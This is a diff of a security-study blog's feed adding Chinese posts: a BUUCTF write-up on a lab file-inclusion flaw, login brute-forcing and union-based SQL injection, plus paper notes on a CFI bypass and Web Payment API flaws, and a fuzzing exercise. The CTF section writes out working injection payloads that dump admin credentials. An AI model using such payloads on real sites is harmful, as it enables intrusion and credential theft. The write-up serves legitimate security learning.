@@ -4,6 +4,106 @@
   
   
   <entry>
+    <title>BUUCTFWriteUp1</title>
+    <link href="/2023/09/02/BUUCTFWriteUp1/"/>
+    <url>/2023/09/02/BUUCTFWriteUp1/</url>
+    
+    <content type="html"><![CDATA[<p><strong>LFI COURSE 1</strong></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902093905518.png" alt="image-20230902093905518"></p><p><code>if(isset($_GET[&#39;file&#39;])) &#123; ... &#125;</code>：这是一个条件语句，用于检查是否存在名为 ‘file’ 的 GET 参数。如果存在，代码块内的内容将被执行。</p><p><code>$str = $_GET[&#39;file&#39;];</code>：将名为 ‘file’ 的 GET 参数的值存储在变量 <code>$str</code> 中。</p><p><code>include $_GET[&#39;file&#39;];</code>：这行代码尝试包含一个文件，文件名由 GET 参数 ‘file’ 的值指定</p><p>用户可以通过GET参数来指定要包含的文件，include可能存在LFI（文件包含漏洞攻击）</p><p>尝试?file&#x3D;&#x2F;flag   ?file&#x3D;&#x2F;flag.txt ?file&#x3D;&#x2F;flag.php </p><p>?file&#x3D;&#x2F;flag可以直接得到flag</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902094347903.png" alt="image-20230902094347903"></p><p><strong>BRUTE 1</strong></p><p>进入靶机后以下界面：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902102422665.png" alt="image-20230902102422665"></p><p>随意尝试组合用户名为123，password为123，返回“用户名错误”</p><p>用burpsuite抓包可以得到以下信息</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902102530889.png" alt="image-20230902102530889"></p><p>根据题目意思Brute为野蛮的，推测为暴力破解，则选择send to Intruder，因为返回为“用户名错误”而不是“用户名或密码错误”，在尝试时，推测可以先确定用户名，再确定密码，不需要两边同时爆破</p><p>所以构造：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103129156.png" alt="image-20230902103129156"></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103004685.png" alt="image-20230902103004685"></p><p>用户名字典和密码字典为网上下载，导入后选择Simple list，开始爆破</p><p>当用户名为admin时：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103201354.png" alt="image-20230902103201354"></p><p>所以修改payload：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103408791.png" alt="image-20230902103408791"></p><p>得到正确的值6490</p><p>至此得到用户名为admin，密码为6490，输入可以得到flag</p><p><strong>SQL COURSE 1</strong></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902150719714.png" alt="image-20230902150719714"></p><p>随便点击</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902163825700.png" alt="image-20230902163825700"></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902163842513.png" alt="image-20230902163842513"></p><p>看到在访问backend&#x2F;content_detail.php?id&#x3D;1处，可能存在sql注入点，扔到HackBar中开始测试</p><p>分别尝试<code>?id=1 and 1=1</code>和 <code>?id=1 and 1=2</code> 发现第一条有回显，第二条没有，判断为数字型注入</p><p>判断or是否被过滤：</p><p><code>?id=1 or 1=1</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902170242985.png" alt="image-20230902170242985"></p><p>判断列数：</p><p><code>?id=1 order by 1</code> 有回显</p><p><code>?id=1 order by 2</code>有回显</p><p><code>?id=1 order by 3</code>无回显</p><p>所以表有两列</p><p>确定字段的显示顺序</p><p><code>?id=-1 union select 1,2</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902170731553.png" alt="image-20230902170731553"></p><p>爆破数据库：</p><p><code>?id=-1 union select database(), database()</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171015321.png" alt="image-20230902171015321"></p><p>根据获得的数据库的名称，获取数据表的信息</p><p><code>?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171132043.png" alt="image-20230902171132043"></p><p><code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;</code>这部分会连接数据库中的所有表格名称，并以逗号分隔的形式返回。于是得到了表名信息admin, contents</p><p>使用admin表，获取字段信息</p><p><code>?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;news&#39; and table_name=&#39;admin&#39;)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171445924.png" alt="image-20230902171445924"></p><p>此处union select后的1作为占位符，使得结果可以对齐，括号中的查询语句可以获得news库admin表中的所有列名</p><p>获取username</p><p><code>?id=-1 union select 1,(select group_concat(username) from admin)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171958351.png" alt="image-20230902171958351"></p><p>获取密码</p><p><code>?id=-1 union select 1,(select group_concat(password) from admin)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902172038494.png" alt="image-20230902172038494"></p><p>根据得到的信息即可得到flag</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Basic</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CTF</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>ReadPaper2</title>
+    <link href="/2023/07/27/ReadPaper2/"/>
+    <url>/2023/07/27/ReadPaper2/</url>
+    
+    <content type="html"><![CDATA[<h2 id="WarpAttack-Bypassing-CFI-through-Compiler-Introduced-Double-Fetches-（WarpAttack：通过编译器引入的双重获取绕过CFI）"><a href="#WarpAttack-Bypassing-CFI-through-Compiler-Introduced-Double-Fetches-（WarpAttack：通过编译器引入的双重获取绕过CFI）" class="headerlink" title="WarpAttack: Bypassing CFI through Compiler-Introduced Double-Fetches （WarpAttack：通过编译器引入的双重获取绕过CFI）"></a>WarpAttack: Bypassing CFI through Compiler-Introduced Double-Fetches （WarpAttack：通过编译器引入的双重获取绕过CFI）</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>如今多数系统上运行的软件是由C&#x2F;C++编写的，容易出现内存损坏错误，因此需要对这些程序进行彻底的测试以尽可能的消除错误，但通常测试时不完整的，因此会在代码中添加缓解措施以增加攻击的难度，广泛应用的措施有：</p><p>地址空间布局随机话（ASLR）：操作系统在加载进程的时候，会随机地改变可执行文件、共享库、堆栈和其他内存区域的基地址，使得这些区域在每次运行时都位于不同的内存地址位置。</p><p>堆栈canaries（Stack Canaries）：通过在函数返回地址之前或之后插入一个特殊的随机值（称为堆栈金丝雀或堆栈哨兵），来检测堆栈缓冲区溢出攻击。在函数执行结束时，系统会检查这个堆栈金丝雀的值是否被修改过，如果被修改，就说明发生了堆栈缓冲区溢出攻击。如果检测到这种异常情况，程序通常会立即终止执行，从而防止恶意代码得以执行。</p><p>数据执行预防（DEP）：通过硬件和操作系统的支持，在内存中标记某些区域为”不可执行”，也就是阻止这些区域的数据作为指令被执行。这样一来，即使攻击者成功注入恶意代码到内存中，也无法执行，因为这些区域被标记为只能包含数据而不能执行指令。</p><p>代码重用攻击在这些缓解措施下仍然有效，例如ROP（返回导向编程），针对这一点，CFI（Control-Flow Integrity）被认为是阻止代码重用攻击的关键措施。CFI首先静态计算程序的控制流图（CFG），并确定所有合法的控制流传输目标。然后，CFI会在代码中插入检查，以在运行时验证每个控制流传输。</p><p>但目前的编译器对于缓解措施插入的安全检查代码并不会视为特权代码，所以在进行代码优化时，可能导致安全性遭到破坏使攻击者有Time-of-Check to Time-Of-Use（TOCTTOU）的机会 。</p><p>例如：代码中存在switch语句，执行时通常遵循以下模式，给定一个跳转表和一个索引，程序首先获取索引值以验证边界检查是否满足跳转表大小，然后再次获取索引值以进行实际的跳转处理。由于索引被多次加载（获取），攻击者可以在边界检查后覆盖索引值，最终允许在跳转表之外进行任意跳转。</p><p>本文研究了由双重获取引入的TOCTOU漏洞，并提出了攻击WarpAttack，并在firefox上成功实施</p><h3 id="Threat-Model"><a href="#Threat-Model" class="headerlink" title="Threat Model"></a>Threat Model</h3><p>攻击者能力：</p><ul><li>任意读写：攻击者持有一个内存损坏漏洞（如use-after-free错误），使其能够读写任意内存。C&#x2F;C++ 程序容易受到此类漏洞的影响</li><li>线程控制：攻击者能够主动控制与被攻击程序在同一地址空间内的线程。</li><li>Gadget：受害者程序包含足够的 gadget 代码片段，即带有编译器引入的双重获取的开关跳转表。</li></ul><p><em>Gadget 是一种有用的构造块，可以被组合成攻击载荷，以绕过程序的安全措施和执行恶意操作。这些构造块通常是由程序本身的代码片段组成，例如函数的一部分或条件分支的一小段代码。</em></p><p>攻击者目标是劫持控制流到特定位置</p><p>防御假设：</p><p>不可执行内存：受害者程序受到DEP保护，攻击者无法执行任何注入式攻击，只能进行代码重用攻击</p><p>随机化：受害者程序受地址空间随机化保护</p><p>控制流保护：受害者程序应用完全精确的静态 CFI</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Study</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ReadPaper</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>ReadPaper1:WPA</title>
+    <link href="/2023/07/26/ReadPaper1/"/>
+    <url>/2023/07/26/ReadPaper1/</url>
+    
+    <content type="html"><![CDATA[<h2 id="A-Formal-Security-Analysis-of-the-W3C-Web-Payment-APIs-Attacks-and-Verification-W3C-Web-支付-API-的正式安全分析：攻击和验证"><a href="#A-Formal-Security-Analysis-of-the-W3C-Web-Payment-APIs-Attacks-and-Verification-W3C-Web-支付-API-的正式安全分析：攻击和验证" class="headerlink" title="A Formal Security Analysis of the W3C Web Payment APIs: Attacks and Verification(W3C Web 支付 API 的正式安全分析：攻击和验证)"></a>A Formal Security Analysis of the W3C Web Payment APIs: Attacks and Verification(W3C Web 支付 API 的正式安全分析：攻击和验证)</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>当下支付环境多样，有Stripe，Google pay，PayPal等多种支付方式，存在的问题有：</p><ul><li>恶意顾客可能会篡改商家与支付处理机构之间的信息流</li><li>支付处理机构的方案可能存在缺陷</li><li>用户可能会被多种不同的用户界面所困惑，从而更容易受到网络钓鱼攻击</li></ul><p>此外，在面对有些支付界面较为复杂时，用户可能直接关闭支付进程</p><p>为此，W3C（World Wide Web Consortium）目前正在开发WPA（Web Payment APIs）这是一种简化和标准化浏览器中的支付和结账流程的方法。其主要思想是，商家不再自己提供用于结账的网页或JavaScript，而是将这个过程交给用户的Web浏览器来处理。浏览器随后呈现给用户全新的支付用户界面（见图1），该界面位于Web上下文之外。在这个用户界面中，用户可以查看订单，选择（预先存储的）送货地址、支付方式和支付处理器（例如使用Stripe信用卡付款）。</p><p><img src="/2023/07/26/ReadPaper1/image-20230727152130120.png" alt="image-20230727152130120"></p><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><ul><li>本文的分析是在详细的Web基础设施模型中，对Web Payment的首次分析</li><li>分析基于迄今为止最全面的Web基础设施模型——WIM，并做出了重要扩展</li><li>制定了反映使用WPA进行支付的完整性的精确安全属性：支付意图和支付唯一性。在尝试证明这些属性时，发现了两个关键性的漏洞，并提出了修复措施</li></ul><h3 id="THE-W3C-WEB-PAYMENT-APIS"><a href="#THE-W3C-WEB-PAYMENT-APIS" class="headerlink" title="THE W3C WEB PAYMENT APIS"></a>THE W3C WEB PAYMENT APIS</h3><h4 id="安全属性"><a href="#安全属性" class="headerlink" title="安全属性"></a>安全属性</h4><p><strong>支付意图</strong></p><p>浏览器会将用户表达意图的所有支付存储在一个名为PaymentIntents的字典中，它保证了支付提供者在进行交易时与顾客在支付UI界面中确认的信息一致。具体来说，这意味着支付的发送方、接收方和总金额与顾客在浏览器中确认的信息相符。这个属性可以防止恶意方代表顾客进行未经授权的支付。</p><p><strong>支付唯一性</strong></p><p>每个支付提供者则在其状态中存储所有已执行交易的记录，存储在一个名为”transactions”的映射表中，支付的唯一性确保对于客户授权的每笔付款，任何诚实的支付提供者最多执行一个交易，并且该交易具有正确的值。</p><h4 id="工作流"><a href="#工作流" class="headerlink" title="工作流"></a>工作流</h4><p><img src="/2023/07/26/ReadPaper1/image-20230727102822005.png" alt="image-20230727102822005"></p><ol><li>商家创建支付请求，支付请求中包含字段：id（支付的唯一标识符）&#x2F;商家接受的支付方法（methodData）&#x2F;总花费和一些商品可选细节（details）&#x2F;用户必须提供哪些数据（options：例如地址，电话）</li><li>通过Payment Request API将数据交给浏览器，浏览器根据支付请求中的 methodData（商家支持的支付方式）与已注册的支付处理程序进行对比，并选择在 methodData 中至少一种支付方式注册的所有支付处理程序。</li><li>在进行初步选择后，浏览器对每个选中的支付处理程序触发 CanMakePaymentEvent（支付是否可进行事件）。此事件包含有关所请求支付的基本信息，如商家顶层页面的源地址、支付请求发起的源地址以及适用的支付方式数据集（来自 PR.methodData）</li><li>支付处理程序在接收 CanMakePaymentEvent 后确定是否可以处理该支付请求。此决策过程特定于支付方式，并可能取决于法律要求。</li><li>在接收完所有触发的支付处理程序的响应后，浏览器显示一个特殊的对话框，称为支付 UI（用户界面）。这个支付 UI 不是网站的一部分，而是浏览器本身的界面（参见图1）。支付 UI 允许顾客输入（或选择存储的）所需信息，如送货地址、电子邮件地址以及支付详细信息。</li><li>支付详细信息包括选择可用支付处理程序和支付方式。如果顾客输入（或选择存储的或更改的）送货地址，还需要额外的步骤：因为这可能会改变送货费用，因此商家网站会收到一个部分匿名化的地址以重新计算送货费用。</li><li>顾客提交选择后，浏览器组装一个 PaymentRequestEvent（支付请求事件）并将其交给顾客选择的支付处理程序。该 PaymentRequestEvent 包含与 CanMakePaymentEvent 相同的数据（见上文），以及顾客输入的支付数据，如信用卡号、过期日期和验证号码。</li><li>在接收 PaymentRequestEvent 后，支付处理程序采取必要的步骤来执行或至少促进支付。</li><li>在执行这些步骤后，支付处理程序通过创建 PaymentHandlerResponse（支付处理程序响应）来完成其工作。此响应包含（再次）支付方式标识符和一个 details 字段，其确切内容取决于支付方式。details 的内容可以是支付提供者的某些签名支付确认，或者仅为“反映”信用卡数据等简单内容。</li><li>收到支付处理程序响应后，浏览器创建一个支付响应并将其返回给商家的网站。支付响应包含来自处理程序响应的 details、所选支付方式以及商家在 PR.options 中请求的额外数据，如送货地址。</li><li>商家现在可以检查响应（例如，验证信用卡数据的有效性）并通过表示结账过程完成（在这种情况下，浏览器关闭支付 UI）或表示出现问题而终止流程。</li></ol><p>一旦顾客进行了修改并重新提交，浏览器会向随后选择的支付处理程序触发另一个 PaymentRequestEvent，其中包含相同的支付标识符，但可能不同的支付细节（例如，由顾客选择的不同支付方式）。支付处理程序然后处理并可能更新支付（如有必要），再次用处理程序响应触发浏览器创建支付响应并将其交给商家。此时，商家可以再次接受支付响应或发起另一个重试。</p><h4 id="存在的漏洞"><a href="#存在的漏洞" class="headerlink" title="存在的漏洞"></a>存在的漏洞</h4><p><strong>Double Charging with Retry（重试引起的重复支付）</strong></p><p>在这个攻击过程中，假设有一个恶意商家和一个诚实的顾客。攻击利用了WPA中的重试机制。</p><ol><li>顾客发起结账：顾客在恶意商家的网站上发起结账请求。</li><li>商家创建支付请求：商家创建一个正常的支付请求，并将其交给浏览器处理。</li><li>浏览器引导支付流程：浏览器根据WPA规范的步骤，引导顾客完成支付流程的步骤6到11，这包括选择支付方式、确认支付等。</li><li>收到支付响应：商家收到顾客的支付响应，但在这里进行了攻击。</li><li>触发重试：商家触发了一个重试请求（retry），这意味着商家在第一次支付时出现了问题，要求顾客切换到不同的支付处理器和支付方式提供商，因为第一个支付方式据称不起作用。</li><li>显示错误信息：浏览器在其支付界面中显示了错误信息，告知顾客需要切换支付方式。</li><li>顾客选择不同的支付方式：由于顾客认为第一个支付方式存在问题，她选择了不同的支付处理器和支付方式提供商，并再次提交支付请求。</li><li>触发新的支付处理器：浏览器触发了新的支付处理器，该处理器执行第二次支付。</li><li>第二次支付：新的支付处理器执行了第二次支付，这就是攻击实现了双重收费的地方。</li><li>结账完成：攻击完成后，整个结账流程继续进行，顾客完成了支付流程，而没有任何提示表明她支付了两次。</li></ol><p>这个攻击是由于浏览器的行为，而不是支付处理器的实现。第二个支付处理器无法检测到它是在重试上下文中调用的，因为它之前没有见过整个交易的支付id。攻击者可以反复利用这个漏洞，让顾客反复被收取双重费用，而商家和支付处理器无法察觉。</p><p>修复措施：</p><p>可以在交易重复使用不同处理程序时通知支付处理程序，以便它可以撤销支付并在成功撤销后再触发第二个支付处理程序。或者支付处理程序可以在其响应中包含一个状态，指示是否已经进行了支付，并阻止在这种情况下更改支付处理程序。在与W3C Web Payments Working Group的讨论中，他们选择了一个非常简单的修复方法，即完全禁止更改支付处理程序，尽管这可能会迫使顾客中止整个流程，如果一开始选择的支付处理程序实际上不能正常工作。这是规范最终采用的方法。</p><p><strong>Ambiguous Payment Method Data（模棱两可的支付数据）</strong></p><p>在这个攻击过程中，假设商家是恶意的，而其他人都是诚实的。攻击利用了WPA规范中的一个特定字段——methodData。以下是攻击的步骤：</p><ol><li>商家创建支付请求：商家创建一个支付请求PR，其中methodData字段包含两个条目，都是相同的支付方式，即具有相同的支付方式标识符。根据W3C规范，这是完全有效的。其中一个条目可能不包含任何费用，而另一个可能包含非常高的费用。</li><li>提交支付请求：商家将支付请求PR提交给WPA（如往常一样）。这触发浏览器在其安装的支付处理器列表中搜索与PR中给定的支付方式标识符匹配的处理器，并查询匹配的处理器。</li><li>显示支付界面：之后，浏览器显示支付界面。我们假设用户总是选择第一个条目，即不包含额外费用的条目。她输入所需数据并提交。</li><li>调用支付处理器：现在，浏览器将带有支付细节的PaymentRequestEvent（包括完整的methodData列表，即两个条目）交给所选的支付处理器。</li><li>支付处理器决策：然而，PaymentRequestEvent不包含用户从methodData中选择了哪个条目的信息。支付处理器现在必须决定使用哪个支付方式数据条目。由于规范中也没有关于此的指导，我们假设支付处理器总是选择最后一个支付方式数据条目（在我们的攻击中会产生巨额的额外费用）并执行支付。</li><li>完成支付：其余步骤与常规支付流程相同。结果是，顾客被收取了她从未同意的费用，而没有任何提示。</li></ol><p>这种攻击并不依赖于浏览器和支付处理器在存在多个适用的methodData条目时如何确定选择哪一个，只要存在这样的可能性，它们选择不同的条目即可。这使得顾客被收取未知费用的攻击成为可能。</p><p>修复措施：</p><p>浏览器可以拒绝模棱两可的条目，或者将用户的选择传递给支付处理程序。我们建议采用第一种选项，以保持API接口的稳定性。因为每次用户选择的变化都可能需要更新支付处理程序的实现，导致接口的不稳定性和不一致性。</p><h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><p>为了全面分析WPA，对WIM做出了以下拓展</p><ol><li>可扩展的DOM事件处理：WPA大量使用DOM事件来触发支付处理程序。为了模拟这些事件的处理过程，WIM（Web Infrastructure Model）的浏览器模型被扩展，引入了一组待处理事件和一个可扩展的处理函数。当浏览器被触发处理DOM事件时，其中一个待处理事件会被随机选择，从待处理事件集合中移除，并交给处理函数处理。这样，模拟了事件的传递和处理过程。</li><li>Service Workers：Service Workers是在浏览器中后台运行的事件驱动型JavaScript程序，可用于为Web应用程序提供离线功能。在WPA中，支付处理程序被视为Service Workers的实例。因此，WIM的浏览器模型被扩展，加入了一组注册的Service Workers。类似于事件处理，当浏览器被触发时，Service Worker可以被非确定性地选择执行，从而模拟了Service Worker的运行过程。</li><li>脚本API扩展：WPA本身是WIM浏览器模型的重要扩展。WPA已被各大主流浏览器实现，这导致了在真实执行环境中，网页应用程序和脚本（诚实或不诚实）可能会干扰WPA的各个部分，从而扩大了攻击面。为此，WIM的脚本API被扩展，将WPA规范中定义的API函数形式化为脚本命令，即脚本可以输出命令，指示浏览器调用具有给定参数列表的API函数。这些API函数的定义遵循WPA规范，并允许对其进行形式化的分析。</li></ol><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p><strong>为什么此处对于WPA模型安全性的分析都是假设商家是恶意的而用户是诚实的</strong></p><p>个人理解：首先，用户的行为通常是会受到较大约束的，发起主动攻击的难度较大。多数攻击是针对正常运作的系统发起的。虽然用户的一些攻击行为可能会获取不当利益，例如进行虚假支付。但是从安全研究的角度来看，通常更关注的是那些针对系统本身的漏洞和攻击。其次，当进行系统安全性评估和漏洞分析时，假设商家是恶意的可以帮助研究人员更好地理解系统的脆弱点和潜在风险。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Study</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ReadPaper</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Exercise3</title>
+    <link href="/2023/07/22/Exercise3/"/>
+    <url>/2023/07/22/Exercise3/</url>
+    
+    <content type="html"><![CDATA[<h2 id="Exercise3-TCPdump"><a href="#Exercise3-TCPdump" class="headerlink" title="Exercise3 TCPdump"></a>Exercise3 TCPdump</h2><h3 id="任务目标"><a href="#任务目标" class="headerlink" title="任务目标"></a>任务目标</h3><ul><li>在TCPdump4.9.2中找到 <a href="https://www.cvedetails.com/cve/CVE-2017-13028/"><strong>CVE-2017-13028</strong></a>的崩溃</li><li>了解什么是Address Sanitizer</li><li>了解如何使用ASan模糊目标分析崩溃</li></ul><h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p><strong>下载安装TCPdump</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-variable">$HOME</span><br>mkdir fuzzing_tcpdump &amp;&amp; cd fuzzing_tcpdump/<br><br>wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/the-tcpdump-group/</span>tcpdump<span class="hljs-regexp">/archive/</span>refs<span class="hljs-regexp">/tags/</span>tcpdump-<span class="hljs-number">4.9</span>.<span class="hljs-number">2</span>.tar.gz<br>tar -xzvf tcpdump-<span class="hljs-number">4.9</span>.<span class="hljs-number">2</span>.tar.gz<br></code></pre></td></tr></table></figure><h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3>]]></content>
+    
+    
+    <categories>
+      
+      <category>Fuzzing101</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>learning</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Exercise2</title>
     <link href="/2023/07/19/Exercise2/"/>
     <url>/2023/07/19/Exercise2/</url>
